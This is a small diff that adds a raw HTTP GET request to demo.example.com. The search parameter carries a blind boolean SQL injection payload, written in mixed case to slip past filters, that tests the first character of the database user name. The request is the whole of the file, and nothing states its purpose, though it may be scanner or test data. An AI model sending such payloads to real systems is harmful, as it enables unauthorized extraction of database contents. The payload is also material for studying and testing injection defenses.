@@ -1,0 +1,4 @@
+GET /a?search=1'%20aNd%20AsCiI(sUbStRiNg(UsEr(),1,1))>64%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
